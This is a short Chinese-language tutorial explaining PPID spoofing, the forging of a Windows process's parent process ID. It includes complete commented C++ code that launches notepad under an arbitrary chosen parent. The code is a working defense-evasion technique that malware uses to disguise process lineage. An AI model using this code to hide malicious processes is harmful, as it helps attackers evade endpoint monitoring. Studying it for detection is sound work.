# 什么是PPID Spoofing

**PPID Spoofing** 是指 **Parent Process ID Spoofing**，即“父进程ID伪造”。

在计算机操作系统中，每个进程都有一个唯一的进程ID（PID），以及一个指向启动它的父进程的父进程ID（PPID）。PPID Spoofing是一种技术，它允许恶意代码伪造其父进程ID，使其看起来像是由另一个合法或良性的进程启动的。



# 实现代码

```cpp
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <TlHelp32.h>
#include <iostream>

int main()
{   

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));  // 初始化si结构体为0

    // 打开具有指定PID（在此例中为4396）的进程并获取其句柄
    // 这将作为新进程的父进程
    HANDLE parentProcessHandle = OpenProcess(MAXIMUM_ALLOWED, false, 4396);

    // 第一次调用是为了计算所需的属性列表的大小
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

    // 为属性列表分配空间
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);

    // 第二次调用是为了真正初始化属性列表
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

    // 更新属性列表，设置新进程的父进程为我们指定的进程
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentProcessHandle, sizeof(HANDLE), NULL, NULL);

    // 设置启动信息的大小
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // 创建新的notepad进程，使用上面的启动信息，从而使新进程的父进程为我们指定的进程
    CreateProcessA(NULL, (LPSTR)"notepad", NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi);

    return 0;
}
```

